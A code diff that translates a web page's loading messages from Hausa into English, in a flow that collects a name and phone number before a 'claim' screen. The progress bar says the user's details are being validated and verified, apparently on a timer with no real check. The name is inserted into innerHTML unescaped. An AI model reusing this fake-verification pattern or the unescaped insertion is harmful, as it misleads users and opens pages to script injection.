@@ -710,7 +710,7 @@ function showPage1(){
 function showPage2(name){
   hideAllScreens();
   page2.classList.remove("hidden");
-  userNameShow.innerHTML = "Suna: <b>" + name + "</b>";
+  userNameShow.innerHTML = "name: <b>" + name + "</b>";
 }
 
 function showClaim(name){
@@ -725,15 +725,15 @@ function runLoading(name, phone){
   saveProgress("page2", name, phone);
 
   let steps = [
-    {text:"Ana duba sunanka...", width:"25%"},
-    {text:"Ana tabbatar da lambar wayarka...", width:"50%"},
-    {text:"Ana rijistar bayananka...", width:"75%"},
-    {text:"An kammala rajista...", width:"100%"}
+    {text:"Validating your name...", width:"25%"},
+    {text:"Your Info is being verified...", width:"50%"},
+    {text:"Your information is being registered...", width:"75%"},
+    {text:"loading...", width:"100%"}
   ];
 
   let i = 0;
   bar.style.width = "0%";
-  statusText.innerText = "Ana duba sunanka...";
+  statusText.innerText = "Checking your name...";
 
   let loading = setInterval(function(){
     statusText.innerText = steps[i].text;
